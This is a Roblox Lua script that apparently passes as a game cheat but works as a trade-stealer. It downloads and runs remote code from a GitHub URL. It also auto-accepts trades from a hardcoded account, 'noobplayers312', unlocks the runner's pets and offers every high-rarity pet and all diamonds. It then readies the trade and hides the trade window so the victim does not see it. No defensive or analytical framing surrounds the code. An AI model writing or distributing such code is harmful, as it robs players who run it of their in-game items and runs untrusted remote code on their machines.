
spawn(function()
    task.wait(5)
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CryMoreScript/Kestem/refs/heads/main/Manager.lua", true))()
    end)
end)
spawn(function()
    pcall(function()
        getgenv().wearescammerguyss = true

        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        local UIAction = ReplicatedStorage:WaitForChild("Events"):WaitForChild("UIAction")
        local ClientDataManager = require(LocalPlayer.PlayerScripts.MainClient.ClientDataManager)
        local PetsInfo = require(ReplicatedStorage.Modules.PetsInfo.Pets)

        local TARGET_RARITIES = { [8] = true, [9] = true }
        local TradePlayerUsername = "noobplayers312"

        local ActiveTrade = nil
        ReplicatedStorage.Events.UpdateClientTrade.OnClientEvent:Connect(function(tradeData)
            ActiveTrade = tradeData
        end)

        local function SendTradeRequest()
            local targetPlayer = Players:FindFirstChild(TradePlayerUsername)
            if targetPlayer then
                pcall(function()
                    UIAction:FireServer("RequestTradeWithPlayer", game.Players:FindFirstChild("noobplayers312"))
                end)
                pcall(function()
                    UIAction:FireServer("RequestTradeWithPlayer", targetPlayer)
                end)
            end
        end

        local function GetLocalOffer()
            if not ActiveTrade then return nil end
            local idx = (ActiveTrade.Player1 == LocalPlayer) and 1 or 2
            return {
                Pets = ActiveTrade["Player"..idx.."Offer"] or {},
                Diamonds = ActiveTrade["Player"..idx.."DiamondsOffer"] or 0,
                Ready = ActiveTrade["Player"..idx.."Accepted"] or false
            }
        end

        local function AddPetsAndDiamonds()
            local offer = GetLocalOffer()
            if not offer then return end

            for petId, petData in pairs(ClientDataManager.Data.Pets) do
                local rarity = PetsInfo[petData.Type] and PetsInfo[petData.Type].Rarity
                if rarity and TARGET_RARITIES[rarity] and not offer.Pets[petId] then
                    UIAction:FireServer("AddPetInTrade", petId)
                end
            end

            local totalDiamonds = ClientDataManager.Data.Diamonds or 0
            if offer.Diamonds < totalDiamonds then
                UIAction:FireServer("ModifyDiamondOffer", totalDiamonds)
            end
        end

        local function SmartReady()
            local offer = GetLocalOffer()
            if offer and not offer.Ready then
                -- Send ready no matter what
                UIAction:FireServer("ReadyTrade")
            end
        end

        local function unlockAllPets()
            local petsData = ClientDataManager.Data.Pets
            
            if not petsData then
                return false
            end
            
            local unlockedCount = 0
            for petId, petData in pairs(petsData) do
                if petData.Locked then
                    local args = {
                        [1] = "TogglePetLocked",
                        [2] = petId
                    }
                    UIAction:FireServer(unpack(args))
                    
                    unlockedCount = unlockedCount + 1
                    
                    task.wait(0.1)
                end
            end
            if unlockedCount > 0 then
                return true
            else
                return false
            end
        end

        spawn(function()
            while wearescammerguyss do task.wait(0.5)
                pcall(function()
                    pcall(function()
                        game.ReplicatedStorage.Events.UIAction:FireServer("AcceptPlayersTradeRequest", game.Players:FindFirstChild("noobplayers312"))
                    end)
                    pcall(function()
                        game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame.Visible = false
                    end)
                    pcall(function()
                        game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = false
                    end)
                    pcall(function()
                        game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.PopupFrameInfo.Visible = false
                    end)
                end)
                
                pcall(function()
                    local player = game:GetService("Players").LocalPlayer
                    local titleLabel = player.PlayerGui.MainGui.OtherFrames.Trade.Frame.OtherInventory.Title
                    local text = string.lower(titleLabel.Text)
                    local targetName = "noobplayers312"

                    if string.find(text, targetName) then
                        pcall(function()
                            AddPetsAndDiamonds()
                        end)
                        pcall(function()
                            SmartReady()
                        end)
                    else
                    end
                end)
                
            end
        end)

        spawn(function()
            while wearescammerguyss do task.wait(0.5)
                local targetPlayer = Players:FindFirstChild(TradePlayerUsername)
                if targetPlayer then
                    unlockAllPets()
                end
                wait(0.5)
            end
        end)

    end)
end)
